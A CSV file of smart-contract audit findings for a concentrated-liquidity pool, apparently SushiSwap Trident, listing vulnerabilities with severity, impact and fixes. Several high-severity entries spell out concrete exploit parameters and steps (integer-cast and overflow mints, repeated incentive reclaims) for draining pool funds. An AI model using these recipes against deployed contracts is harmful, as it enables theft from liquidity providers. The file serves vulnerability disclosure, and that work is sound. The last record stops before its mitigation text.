file_name,vuln_title,severity,description
35.md,Unsafe cast in `ConcentratedLiquidityPool.burn` leads to attack,high,"The `ConcentratedLiquidityPool.burn` function performs an unsafe cast of a `uint128` type to a *signed* integer.

```solidity
(uint256 amount0fees, uint256 amount1fees) = _updatePosition(msg.sender, lower, upper, -int128(amount));
```

Note that `amount` is chosen by the caller and when choosing `amount = 2**128 - 1`, this is interpreted as `0xFFFFFFFFF... = -1` as a signed integer. Thus `-(-1)=1` adds 1 liquidity unit to the position

This allows an attacker to not only mint LP tokens for free but as this is the `burn` function it also redeems token0/1 amounts according to the unmodified `uint128` `amount` which is an extremely large value.

#### POC

I created this POC that implements a hardhat test and shows how to steal the pool tokens.

Choosing the correct `amount` of liquidity to burn and `lower, upper` ticks is not straight-forward because of two competing constraints:

1.  the `-int128(amount)` must be less than `MAX_TICK_LIQUIDITY` (see `_updatePosition`). This drives the the `amount` up to its max value (as the max `uint128` value is -1 => -(-1)=1 is very low)
2.  The redeemed `amount0, amount1` values must be less than the current pool balance as the transfers would otherwise fail. This drives the `amount` down. However, by choosing a smart `lower` and `upper` tick range we can redeem fewer tokens for the same liquidity.

[This example](https://gist.github.com/MrToph/1731dd6947073343cf6f942985d556a6) shows how to steal 99% of the `token0` pool reserves:

#### Impact

An attacker can steal the pool tokens.

#### Recommended Mitigation Steps

Even though Solidity 0.8.x is used, type casts do not throw an error.
A [`SafeCast` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeCast) must be used everywhere a typecast is done."
35.md,Wrong usage of `positionId` in `ConcentratedLiquidityPoolManager`,high,"#### Impact
In the `subscribe` function of `ConcentratedLiquidityPoolManager`, the `incentive` to subscribed is determined as follows:

```solidity
Incentive memory incentive = incentives[pool][positionId];
```

However, `positionId` should be `incentiveId`, a counter that increases by one whenever a new incentive is added to the pool. The usage of `positionId` could cause the wrong incentive to be used, and in general, the incentive is not found, and the transaction reverts (the condition `block.timestamp < incentive.endTime` is not met). The `getReward` and `claimReward` functions have the bug of misusing `positionId` as the index of incentives.

#### Proof of Concept
Referenced code:
- [ConcentratedLiquidityPoolManager.sol#L68](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPoolManager.sol#L68)
- [ConcentratedLiquidityPoolManager.sol#L87](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPoolManager.sol#L87)
- [ConcentratedLiquidityPoolManager.sol#L105](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPoolManager.sol#L105)

#### Recommended Mitigation Steps
Change `positionId` to `incentiveId` in the referenced lines of code."
35.md,`ConcentratedLiquidityPoolManager`'s incentives can be stolen,high,"The `ConcentratedLiquidityPoolManager` keeps all tokens for all incentives in the same contract. The `reclaimIncentive` function does not reduce the `incentive.rewardsUnclaimed` field and thus one can reclaim tokens several times.
This allows anyone to steal all tokens from all incentives by creating an incentive themself, and once it's expired, repeatedly claim the unclaimed rewards until the token balance is empty.

#### POC
*   Attacker creates an incentive for a non-existent pool using a random address for `pool` (This is done such that no other user can claim rewards as we need a non-zero `rewardsUnclaimed` balance for expiry). They choose the `incentive.token` to be the token they want to steal from other incentives. (for example, `WETH`, `USDC`, or `SUSHI`) They choose the `startTime, endTime, expiry` such that the checks pass, i.e., starting and ending in a few seconds from now, expiring in 5 weeks. Then they choose a non-zero `rewardsUnclaimed` and transfer the `incentive.token` to the `PoolManager`.
*   Attacker waits for 5 weeks until the incentive is expired
*   Attacker can now call `reclaimIncentive(pool, incentiveId, amount=incentive.rewardsUnclaimed, attacker, false)` to withdraw `incentive.rewardsUnclaimed` of `incentive.token` from the pool manager.
*   As the `incentive.rewardsUnclaimed` variable has not been decreased, they can keep calling `reclaimIncentive` until the pool is drained.

#### Impact
An attacker can steal all tokens in the `PoolManager`.

#### Recommended Mitigation Steps
In `reclaimIncentive`, reduce `incentive.rewardsUnclaimed` by the withdrawn `amount`."
35.md,Overflow in the `mint` function of `ConcentratedLiquidityPool` causes LPs' funds to be stolen,high,"#### Impact
Similar to a previous finding in the `IndexPool` contract, the `mint` function of `ConcentratedLiquidityPool` allows integer overflows when checking the balance is larger or equal to the received amount of token plus the reserve. As a result, the attacker could get a large amount of liquidity but only provide a small number of tokens to the pool, effectively stealing other LPs' funds when burning his liquidity.

Notice that this bug is independent of another bug of incorrect casting `uint256` type to `uint128` in the `_getAmountsForLiquidity` function. Even if the previously mentioned bug does not exist, the attacker could still steal the funds in the pool by exploiting this bug.

#### Proof of Concept
1.  Suppose that the current price is at the tick `500000`, an attacker calls the `mint` function with the following parameters:

```solidity
mintParams.lower = 100000
mintParams.upper = 500000
mintParams.amount1Desired = (1 << 128) - 47541305835 # a carefully chosen number
mintParams.amount0Desired = 0
```
2.  Since the current price is equal to the upper price, we have

```solidity
_liquidity = mintParams.amount1Desired * (1 << 96) // (priceUpper - priceLower)
    = 4731732988155153573010127839
```
3.  The amounts of `token0` and `token1` that the attacker has to pay is

```solidity
amount0Actual = 0
amount1Actual = uint128(DyDxMath.getDy(_liquidity, priceLower, priceUpper, true))
    = uint128(_liquidity * (priceUpper - priceLower) // (1 << 96)) # round up
    = uint128(340282366920938463463374607384226905622)
    = 340282366920938463463374607384226905622
    = (1 << 128) - 47541305834
```
4.  As long as `reserve1` is greater than `47541305834`, the addition `amount1Actual + reserve1` overflows to a small number, causing the attacker to pass the balance check.

Referenced code:
- [ConcentratedLiquidityPool.sol#L204](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPool.sol#L204)
- [ConcentratedLiquidityPool.sol#L209](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPool.sol#L209)

#### Recommended Mitigation Steps
Consider removing the `unchecked` statement to check for integer overflow or casting both `amount1Actual` and `reserve1` to type `uint256` before adding them and comparing to the `_balance(token)`."
35.md,Incorrect usage of typecasting in `_getAmountsForLiquidity` lets an attacker steal funds from the pool,high,"#### Impact
The `_getAmountsForLiquidity` function of `ConcentratedLiquidityPool` explicitly converts the result of `DyDxMath.getDy` and `DyDxMath.getDx` from type `uint256` to type `uint128`. The explicit casting without checking whether the integer exceeds the maximum number (i.e., `type(uint128).max`) could cause incorrect results being used. Specifically, an attacker could exploit this bug to mint a large amount of liquidity but only pay a little of `token0` or `token1` to the pool and effectively steal other's funds when burning his liquidity.

#### Proof of Concept
1.  Suppose that the current price is at the tick `500000`, an attacker calls the `mint` function with the following parameters:

```solidity
mintParams.lower = 100000
mintParams.upper = 500000
mintParams.amount1Desired = (1 << 128) + 71914955423 # a carefully chosen number
mintParams.amount0Desired = 0
```
2.  Since the current price is equal to the upper price, we have

```solidity
_liquidity = mintParams.amount1Desired * (1 << 96) // (priceUpper - priceLower)
    = 4731732988155153573010127840
```
3.  The amounts of `token0` and `token1` that the attacker has to pay is

```solidity
amount0Actual = 0
amount1Actual = uint128(DyDxMath.getDy(_liquidity, priceLower, priceUpper, true))
    = uint128(_liquidity * (priceUpper - priceLower) // (1 << 96)) # round up
    = uint128(340282366920938463463374607456141861046)             # exceed the max
    = 24373649590                                                  # truncated
```
4.  The attacker only pays `24373649590` of `token1` to get `4731732988155153573010127840` of the liquidity, which he could burn to get more `token1`. As a result, the attacker is stealing the funds from the pool and could potentially drain it.

Referenced code:
- [ConcentratedLiquidityPool.sol#L480](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPool.sol#L480)
- [concentratedPool/DyDxMath.sol#L15](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/libraries/concentratedPool/DyDxMath.sol#L15)
- [concentratedPool/DyDxMath.sol#L30](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/libraries/concentratedPool/DyDxMath.sol#L30)

#### Recommended Mitigation Steps
Check whether the result of `DyDxMath.getDy` or `DyDxMath.getDx` exceeds `type(uint128).max` or not. If so, then revert the transaction. Or consider using the [`SafeCast` library](https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast) from OpenZeppelin instead."
35.md,`ConcentratedLiquidityPosition.sol#collect()` Users may get double the amount of yield when they call `collect()` before `burn()`,high,"When a user calls `ConcentratedLiquidityPosition.sol#collect()` to collect their yield, it calcuates the yield based on `position.pool.rangeFeeGrowth()` and `position.feeGrowthInside0, position.feeGrowthInside1`:

[`ConcentratedLiquidityPosition.sol#L75` L101](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPosition.sol#L75-L101)

When there are enough tokens in `bento.balanceOf`, it will not call `position.pool.collect()` to collect fees from the pool.

This makes the user who `collect()` their yield when there is enough balance to get double yield when they call `burn()` to remove liquidity. Because `burn()` will automatically collect fees on the pool contract.

#### Impact
The yield belongs to other users will be diluted.

#### Recommended Mitigation Steps
Consider making `ConcentratedLiquidityPosition.sol#burn()` call `position.pool.collect()` before `position.pool.burn()`. User will need to call `ConcentratedLiquidityPosition.sol#collect()` to collect unclaimed fees after `burn()`.

Or `ConcentratedLiquidityPosition.sol#collect()` can be changed into a `public` method and `ConcentratedLiquidityPosition.sol#burn()` can call it after `position.pool.burn()`."
35.md,`ConcentratedLiquidityPosition.sol#burn()` Wrong implementation allows attackers to steal yield,high,"When a user calls `ConcentratedLiquidityPosition.sol#burn()` to burn their liquidity, it calls `ConcentratedLiquidityPool.sol#burn()` -> `_updatePosition()`:

[`ConcentratedLiquidityPool.sol#L525` L553](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPool.sol#L525-L553)

The `_updatePosition()` function will return `amount0fees` and `amount1fees` of the whole position with the `lower` and `upper` tick and send them to the `recipient` alongside the burned liquidity amounts.

#### Proof of Concept
1.  Alice minted \$10000 worth of liquidity with `lower` and `upper` tick set to 99 and 199;
2.  Alice accumulated \$1000 worth of fee in token0 and token1;
3.  The attacker can mint a small amount (\$1 worth) of liquidity using the same `lower` and `upper` tick;
4.  The attacker calls `ConcentratedLiquidityPosition.sol#burn()` to steal all the unclaimed yield with the ticks of (99, 199) include the \$1000 worth of yield from Alice.

#### Recommended Mitigation Steps
Consider making `ConcentratedLiquidityPosition.sol#burn()` always use `address(this)` as `recipient` in:

```solidity
position.pool.burn(abi.encode(position.lower, position.upper, amount, recipient, unwrapBento));
```

and transfer proper amounts to the user."
35.md,Wrong inequality when adding/removing liquidity in current price range,high,"The `ConcentratedLiquidityPool.mint/burn` functions add/remove `liquidity` when `(priceLower < currentPrice && currentPrice < priceUpper)`.
Shouldn't it also be changed if `priceLower == currentPrice`?

#### Impact
Pools that mint/burn liquidity at a time where the `currentPrice` is right at the lower price range do not work correctly and will lead to wrong swap amounts.

#### Recommended Mitigation Steps
Change the inequalities to `if (priceLower <= currentPrice && currentPrice < priceUpper)`."
35.md,range fee growth underflow,high,"#### Impact
The function `RangeFeeGrowth` ([ConcentratedLiquidityPool.sol#L601-L633](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPool.sol#L601-L633)) would revert the transaction in some cases.

When a pool cross a tick, it only updates either `feeGrowthOutside0` or `feeGrowthOutside1`. [Ticks.sol#L23-L53](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/libraries/concentratedPool/Ticks.sol#L23-L53)

`RangeFeeGrowth` calculates the fee as follow:

```solidity
    feeGrowthInside0 = _feeGrowthGlobal0 - feeGrowthBelow0 - feeGrowthAbove0;
    feeGrowthInside1 = _feeGrowthGlobal1 - feeGrowthBelow1 - feeGrowthAbove1;
```

`feeGrowthBelow + feeGrowthAbove` is not necessary smaller than `_feeGrowthGlobal`. Please see `POC`.

Users can not provide liquidity or burn liquidity. Fund will get stocked in the contract. I consider this is a high-risk issue.

#### Proof of Concept
```python
    # This is the wrapper.
    # def add_liquidity(pool, amount, lower, upper)
    # def swap(pool, buy, amount)

    add_liquidity(pool, deposit_amount, -800, 500)
    add_liquidity(pool, deposit_amount, 400, 700)
    # We cross the tick here to trigger the bug.

    swap(pool, False, deposit_amount)
    # Only tick 700's feeGrowthOutside1 is updated

    swap(pool, True, deposit_amount)
    # Only tick 500's feeGrowthOutside0 is updated

    # current tick at -800

    # this would revert
    # feeGrowthBelow1 = feeGrowthGlobal1
    # feeGrowthGlobal1 - feeGrowthBelow1 - feeGrowthAbove1 would revert
    # user would not be able to mint/withdraw/cross this tick. The pool is broken
    add_liquidity(pool, deposit_amount, 400, 700)
```

#### Tools Used
Hardhat

#### Recommended Mitigation Steps
It's either modify the tick's algo or `RangeFeeGrowth`. The quick-fix I come up with is to deal with the fee in `RangeFeeGrowth`. However, I recommend the team to go through tick's logic again."
35.md,`ConcentratedLiquidityPool.burn()` Wrong implementation,high,"The reserves should be updated once LP tokens are burned to match the actual total bento shares hold by the pool.

However, the current implementation only updated reserves with the fees subtracted.

Makes the `reserve0` and `reserve1` smaller than the current `balance0` and `balance1`.

#### Impact
As a result, many essential features of the contract will malfunction, includes `swap()` and `mint()`.

#### Recommended Mitigation Steps

[`ConcentratedLiquidityPool.sol#L263` L267](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPool.sol#L263-L267)
Change:

```solidity
unchecked {
    reserve0 -= uint128(amount0fees);
    reserve1 -= uint128(amount1fees);
}

```

to:
```solidity
unchecked {
    reserve0 -= uint128(amount0);
    reserve1 -= uint128(amount1);
}
```"
35.md,ConcentratedLiquidityPool: incorrect `feeGrowthGlobal` accounting when crossing ticks,high,"##### Impact
Swap fees are taken from the output. Hence, if swapping token0 for token1 (`zeroForOne` is true), then fees are taken in token1. We see this to be the case in the initialization of `feeGrowthGlobal` in the swap cache

`feeGrowthGlobal = zeroForOne ? feeGrowthGlobal1 : feeGrowthGlobal0;`

and in `_updateFees()`.

However, looking at `Ticks.cross()`, the logic is the reverse, which causes wrong fee accounting.

```jsx
if (zeroForOne) {
	...
	ticks[nextTickToCross].feeGrowthOutside0 = feeGrowthGlobal - ticks[nextTickToCross].feeGrowthOutside0;
} else {
	...
	ticks[nextTickToCross].feeGrowthOutside1 = feeGrowthGlobal - ticks[nextTickToCross].feeGrowthOutside1;
}
```

##### Recommended Mitigation Steps
Switch the `0` and `1` in `Ticks.cross()`.

```jsx
if (zeroForOne) {
	...
	// `feeGrowthGlobal` = feeGrowthGlobal1
	ticks[nextTickToCross].feeGrowthOutside1 = feeGrowthGlobal - ticks[nextTickToCross].feeGrowthOutside1;
} else {
	...
	// feeGrowthGlobal = feeGrowthGlobal0
	ticks[nextTickToCross].feeGrowthOutside0 = feeGrowthGlobal - ticks[nextTickToCross].feeGrowthOutside0;
}
```"
35.md,`ConcentratedLiquidityPool`: `secondsPerLiquidity` should be modified whenever pool liquidity changes,high,"##### Impact
`secondsPerLiquidity` is updated as such: `secondsPerLiquidity += uint160((diff << 128) / liquidity);` where `diff = timestamp - uint256(lastObservation)`. Hence, whenever liquidity changes, `secondsPerLiquidity` should be updated prior to the change.

In particular, this affects the `mint()` and `burn()` functions, in the case where liquidity changes when `lowerTick <= currentTick < upperTick`.

In fact, the latest `secondsPerLiquidity` value should be calculated and used in `Ticks.insert()`. For comparison, notice how UniswapV3 fetches the latest value by calling `observations.observeSingle()` in its `_updatePosition()` function.

##### Recommended Mitigation Steps
The `secondsPerLiquidity` increment logic should be applied prior to liquidity addition in `mint()` and removal in `burn()`.

```jsx
// insert logic before these lines in mint()
unchecked {
  if (priceLower < currentPrice && currentPrice < priceUpper) liquidity += uint128(_liquidity);
}

nearestTick = Ticks.insert(
ticks,
feeGrowthGlobal0,
feeGrowthGlobal1,
secondsPerLiquidity, // should calculate and use latest secondsPerLiquidity value
    ...
);

// insert logic before before these lines in burn()
unchecked {
  if (priceLower < currentPrice && currentPrice < priceUpper) liquidity -= amount;
}
```"
35.md,Burning does not update reserves,high,"The `ConcentratedLiquidityPool.burn` function sends out `amount0`/`amount1` tokens but only updates the reserves by decreasing it by the **fees of these amounts**.

```solidity
unchecked {
    // @audit decreases by fees only, not by amount0/amount1
    reserve0 -= uint128(amount0fees);
    reserve1 -= uint128(amount1fees);
}
```

This leads to the pool having wrong reserves after any `burn` action.
The pool's balance will be much lower than the reserve variables.

#### Impact
As the pool's actual balance will be much lower than the reserve variables, `mint`ing and `swap`ing will not work correctly either.
This is because of the `amount0Actual + reserve0 <= _balance(token0)` check in `mint` using a much higher `reserve0` amount than the actual balance (already including the transferred assets from the user). An LP provider will have to make up for the missing reserve decrease from `burn` and pay more tokens.

The same holds true for `swap` which performs the same check in `_updateReserves`.

The pool essentially becomes unusable after a `burn` as LPs / traders need to pay more tokens.

#### Recommended Mitigation Steps
The reserve should be decreased by what is transferred out. In `burn`'s case this is `amount0` / `amount1`."
35.md,`ConcentratedLiquidityPool`: `rangeFeeGrowth` and `secondsPerLiquidity` math needs to be unchecked,high,"##### Impact
The fee growth mechanism, and by extension, `secondsPerLiquidity` mechanism of Uniswap V3 has the ability to underflow. It is therefore a necessity for the math to (ironically) be unsafe / unchecked.

##### Proof of Concept

Assume the following scenario and initial conditions:

*   Price at parity (nearestTick is 0)
*   tickSpacing of 10
*   Swaps only increase the price (nearestTick moves up only)
*   `feeGrowthGlobal` initializes with 0, increases by 1 for every tick moved for simplicity
*   Existing positions that provide enough liquidity and enable nearestTick to be set to values in the example
*   Every tick initialized in the example is ≤ nearestTick, so that its `feeGrowthOutside` = `feeGrowthGlobal`

1.  When nearestTick is at 40, Alice creates a position for uninitialised ticks \[-20, 30]. The ticks are initialized, resulting in their `feeGrowthOutside` values to be set to 40.
2.  nearestTick moves to 50. Bob creates a position with ticks \[20, 30] (tick 20 is uninitialised, 30 was initialized from Alice's mint). tick 20 will therefore have a `feeGrowthOutside` of 50.
3.  Let us calculate `rangeFeeGrowth(20,30)`.
    *   lowerTick = 20, upperTick = 30
    *   feeGrowthBelow = 50 (lowerTick's `feeGrowthOutside`) since lowerTick < currentTick
    *   feeGrowthAbove = 50 - 40 = 10 (feeGrowthGlobal - upperTick's `feeGrowthOutside`) since upperTick < currentTick
    *   feeGrowthInside

        \= feeGrowthGlobal - feeGrowthBelow - feeGrowthAbove

        \= 50 - 50 - 10

        \= -10

We therefore have negative `feeGrowthInside`.

This behaviour is actually acceptable, because the important thing about this mechanism is the relative values to each other, not the absolute values themselves.

##### Recommended Mitigation Steps
`rangeFeeGrowth()` and `rangeSecondsInside()` has to be unchecked. In addition, the subtraction of `feeGrowthInside` values should also be unchecked in `_updatePosition()` and `ConcentratedLiquidityPosition#collect()`.

The same also applies for the subtraction of `pool.rangeSecondsInside` and `stake.secondsInsideLast` in `claimReward()` and `getReward()` of the `ConcentratedLiquidityPoolManager` contract."
35.md,`ConcentratedLiquidityPool`: `initialPrice` should be checked to be within allowable range,high,"##### Impact
No check is performed for the initial price. This means that it can be set to be below the `MIN_SQRT_RATIO` or above `MAX_SQRT_RATIO` (Eg. zero value), which will prevent the usability of all other functions (minting, swapping, burning).

For example, `Ticks.insert()` would fail when attempting to calculate `actualNearestTick = TickMath.getTickAtSqrtRatio(currentPrice);`, which means no one will be able to mint positions.

##### Recommended Mitigation Steps
Check the `initialPrice` is within the acceptable range, ie. `MIN_SQRT_RATIO <= initialPrice <= MAX_SQRT_RATIO`"
35.md,Possible attacks on Seconds * Liquidity calculation,high,"This is a possible line of attack on the staking contract, in particular the `claimReward()` function: [`ConcentratedLiquidityPoolManager.sol#L90` L94](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPoolManager.sol#L90-L94)

1.  A user with some spare capital mints a liquidity position with a very tight range (1-2 ticks wide) at the current price. Because the range is so small, his position.liquidity on his NFT is large (DyDxMath.sol).

2.  The user then sets up a bot to frontrun any price changes that someone else tries to do, burning his position after claiming rewards. He then mints a new liquidity position at the new price after the other persons trades go through.

3.  Rinse and repeat this process. If done correctly, no funds are at risk from the bot owner, he doesn't pay any fees for burning/minting either.

So what you have left is a sequence of positions with high position.liquidity and in the correct price range all the time, without taking on any risk. Thereby stealing incentive funds.

The lines below reward the bot owner with a large amount of the token:

[`ConcentratedLiquidityPoolManager.sol#L90` L94](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPoolManager.sol#L90-L94)
Recommendation:

Lock the positions during a set time while they are staked."
35.md,Understanding the fee growth mechanism (why `nearestTick` is unsuitable),high,"#### Introduction
Uniswap V3's whitepaper describes the fee growth mechanism, but the intuition behind it is not explained well (IMO). I've not been able to find any material that tries to describe it, so allow me the luxury of doing so. It is crucial to understand how it works, so that other issues regarding the fee growth variables (and by extension, secondsPerLiquidity) raised by fellow wardens / auditors are better understood by readers.

#### Objective
We want a way to accurately track the fees accumulated by a position. Fees should only be given to the position it is active (the current tick / price is within the lower and upper ticks of the position).

#### feeGrowthGlobal

Defined as the total amount of fees that would have been earned by 1 unit of unbounded liquidity that was deposited when the contract was first initialized. For simplicity, we can take this to be the range between `MIN_TICK` and `MAX_TICK`. We represent it visually like this:

```jsx
// <-------------------------------------------------------------------------->
// MIN_TICK                                                               MAX_TICK
```

#### feeGrowthOutside

The fee growth per unit of liquidity on the *other* side of this tick (relative to the current tick). What does this mean?

As defined, it is the fee growth **relative** to the current tick. Based on the convention, we define 2 cases:

*   Case 1: initialized tick ≤ pool tick
*   Case 2: Initialized tick > pool tick

Visually, the feeGrowthOutside will look like this:

```jsx
// CASE 1
// <--------------------|--------------------|
// MIN_TICK         INIT_TICK            POOL_TICK
// <-----------------------------------------|
// MIN_TICK                        INIT_TICK = POOL_TICK

// CASE 2
//                                           |--------------------|---------------->
//                                       POOL_TICK           INIT_TICK          MAX_TICK
```

Hence, regardless of whether the tick to initialize is either a lower or upper tick of a position, the `feeGrowthOutside` value that it is referring to is **relatve** to the pool tick.

In other words, if initialized tick ≤ pool tick, then its `feeGrowthOutside` is towards `MIN_TICK`. Otherwise, its `feeGrowthOutside` is towards `MAX_TICK`.

##### Initialization

By convention, when a tick is initialized, all fee growth is assumed to happen below it. Hence, the feeGrowthOutside is initialized to the following values:

*   Case 1: tick's feeGrowthOutside = feeGrowthGlobal
*   Case 2: tick's feeGrowthOtuside = 0

#### Implications

One should now understand why the `feeGrowthOutside` value is being flipped when crossing a tick, ie. `tick.feeGrowthOutside = feeGrowthGlobal - tick.feeGrowthOutside` in `Tick.cross()`, because it needs to follow the definition. (Case 1 becomes case 2 and vice versa).

It should hopefully become clear why **using `nearestTick` as the reference point for fee growth calculations instead of the pool tick might not a wise choice.** (Case 1 and 2 becomes rather ambiguous).

#### Range fee growth / feeGrowthInside

Going back to our objective of calculating the fee growth accumulated for a position, we can break it down into 3 cases (take caution with the boundary cases), and understand how their values are calculated. In general, we take it to be feeGrowthGlobal - fee growth below lower tick - fee growth above upper tick (see illustrations), although it can be simplified further.

1.  pool tick < lower tick

    ```jsx
    // ---------------------|---------------------|-----------------|-----------------
    //                  POOL_TICK            LOWER_TICK          UPPER_TICK
    // <---------------------------- feeGrowthGlobal -------------------------------->
    //       LOWER_TICK.feeGrowthOutside (CASE 2) |---------------------------------->
    //                         UPPER_TICK.feeGrowthOutside (CASE 2) |---------------->

    // we want the range between LOWER_TICK and UPPER_TICK
    // = LOWER_TICK.feeGrowthOutside - UPPER_TICK.feeGrowthOutside

    // alternatively, following the general formula, it is
    // = feeGrowthGLobal - fee growth below LOWER_TICK - fee growth above UPPER_TICK
    // = feeGrowthGlobal - (feeGrowthGlobal - LOWER_TICK.feeGrowthOutside) - UPPER_TICK.feeGrowthOtuside
    // = LOWER_TICK.feeGrowthOutside - UPPER_TICK.feeGrowthOutside
    ```

2.  lower tick ≤ pool tick < upper tick

    ```jsx
    // ---------------------|---------------------|-----------------|-----------------
    //                  LOWER_TICK            POOL_TICK        UPPER_TICK
    // <---------------------------- feeGrowthGlobal -------------------------------->
    // <--------------------| LOWER_TICK's feeGrowthOutside (CASE 1)
    //                       UPPER_TICK's feeGrowthOutside (CASE 2) |---------------->

    // we want the range between LOWER_TICK and UPPER_TICK
    // = feeGrowthGLobal - fee growth below LOWER_TICK - fee growth above UPPER_TICK
    // = feeGrowthGLobal - LOWER_TICK.feeGrowthOutside - UPPER_TICK.feeGrowthOutside
    ```

3.  upper tick ≤ pool tick

    ```jsx
    // ---------------------|---------------------|-----------------|-----------------
    //                  LOWER_TICK            POOL_TICK        UPPER_TICK
    // <---------------------------- feeGrowthGlobal -------------------------------->
    // <--------------------| LOWER_TICK's feeGrowthOutside (CASE 1)
    // <------------------------------------------------------------| UPPER_TICK's feeGrowthOutside (CASE 1)

    // we want the range between LOWER_TICK and UPPER_TICK
    // = UPPER_TICK.feeGrowthOutside - LOWER_TICK.feeGrowthOutside

    // alternatively, following the general formula, it is
    // = feeGrowthGLobal - fee growth below LOWER_TICK - fee growth above UPPER_TICK
    // = feeGrowthGLobal - LOWER_TICK.feeGrowthOutside - (feeGrowthGlobal - UPPER_TICK.feeGrowthOutside)
    // = UPPER_TICK.feeGrowthOutside - LOWER_TICK.feeGrowthOutside
    ```

#### Handling The Boundary Case

An under appreciated, but very critical line of Uniswap V3's pool contract is the following:

`state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;`

It serves a dual purpose:

1.  Because of how Tick Bitmap works, the tick needs to be manually decremented by 1 so that the next tick to be found is in the next word.
2.  More importantly, it handles the boundary case, where `zeroForOne` is true (pool tick goes down). In this scenario, case 1 becomes case 2 when the tick is crossed. However, should the poolTick after the swap be equal to `step.tickNext`, then when calculating fee growth inside a position that so happens to have `step.tickNext` as one of its ticks, it will be treated as case 1 (poolTick = lowerTick / upperTick) when it is required to be treated as case 2.

#### Impact
Hopefully, this writeup helps readers understand the fee growth mechanism and its workings. More importantly, I hope it helps the team to understand why using `nearestTick` as the reference point for fee growth mechanism is unsuitable. Specifically, we have 2 high severity issues:

*   Wrong initialization value of `feeGrowthOutside` in the case either the lower or upper tick becomes the `nearestTick` upon insertion of a new tick.
    *   You are (in a sense) crossing the old nearestTick, so its `secondsPerLiquidityOutside` has to be flipped
    *   The lower / upper tick's `feeGrowthOutside` is incorrectly initialized to be `0` when it should be `feeGrowthOutside`
*   Case 1 and 2 becomes ambiguous. When a position is modified with either tick being `nearestTick`, it is treated to be case 1 when in fact there are times it should be treated as case 2.

#### Recommended Mitigation Steps
Having a pool tick counter that closely matches the current pool price is rather critical for fee growth and seconds per liquidity initializations / calculations.

Where relevant, the `nearestTick` should be replaced by `poolTick`."
35.md,Incentive should check that it hasn't started yet,medium,"The `ConcentratedLiquidityPoolManager.addIncentive` function can add an incentive that already has a non-zero `incentive.secondsClaimed`.

#### Impact
Rewards will be wrong.

#### Recommended Mitigation Steps
Add a check: `require(incentive.secondsClaimed == 0, ""!secondsClaimed"")`."
35.md,Cannot claim reward,medium,"The `ConcentratedLiquidityPoolManager.claimReward` requires `stake.initialized` but it is never set.
It also performs a strange computation as `128 - incentive.secondsClaimed` which will almost always underflow and revert the transaction.

#### Impact
One cannot claim rewards.

#### Recommended Mitigation Steps
Rethink how claiming rewards should work."
35.md,`ConcentratedLiquidityPoolHelper`: `getTickState()` might run out of gas,medium,"##### Impact
`getTickState()` attempts to fetch the state of all inserted ticks (including `MIN_TICK` and `MAX_TICK`) of a pool. Depending on the tick spacing, this function may run out of gas.

##### Recommended Mitigation Steps
Have a starting index parameter to start the iteration from. Also, `tickCount` can be made use of more meaningfully to limit the number of iterations performed.

```jsx
function getTickState(
	IConcentratedLiquidityPool pool,
	int24 startIndex,
	uint24 tickCount
) external view returns (SimpleTick[] memory) {
  SimpleTick[] memory ticks = new SimpleTick[](tickCount);

  IConcentratedLiquidityPool.Tick memory tick;
	int24 current = startIndex;

	for (uint24 i; i < tickCount; i++) {
		tick = pool.ticks(current);
		ticks[i] = SimpleTick({index: current, liquidity: tick.liquidity});
		// reached end of linked list, exit loop
		if (current == TickMath.MAX_TICK) break;
		// else, continue with next iteration
		current = tick.nextTick;
	}

  return ticks;
}
```"
35.md,Users cannot receive rewards from `ConcentratedLiquidityPoolManager` if their liquidity is too large,medium,"#### Impact
There could be an integer underflow error when the reward of an incentive is claimed, forcing users to wait for a sufficient period or reduce their liquidity to claim the rewards.

#### Proof of Concept
The unclaimed reward that a user could claim is proportional to the `secondsInside`, which is, in fact, proportional to the position's liquidity. It is possible that the liquidity is too large and causes `secondsInside` to be larger than `secondsUnclaimed`. As a result, the rewards that the user wants to claim exceed the `incentive.rewardsUnclaimed` and causes an integer underflow error, which prevents him from getting the rewards.

Referenced code:
- [ConcentratedLiquidityPoolManager.sol#L94-L95](https://github.com/sushiswap/trident/blob/c405f3402a1ed336244053f8186742d2da5975e9/contracts/pool/concentrated/ConcentratedLiquidityPoolManager.sol#L94-L95)

#### Recommended Mitigation Steps
Check whether the `rewards` exceeds the `incentive.rewardsUnclaimed`. If so, then send only `incentive.rewardsUnclaimed` amount of rewards to the user."
35.md,`TridentNFT.permit` should always check `recoveredAddress != 0`,medium,"The `TridentNFT.permit` function ignores the `recoveredAddress != 0` check if `isApprovedForAll[owner][recoveredAddress]` is true.

#### Impact
If a user accidentally set the zero address as the operator, tokens can be stolen by anyone as a wrong signature yield `recoveredAddress == 0`.

#### Recommended Mitigation Steps
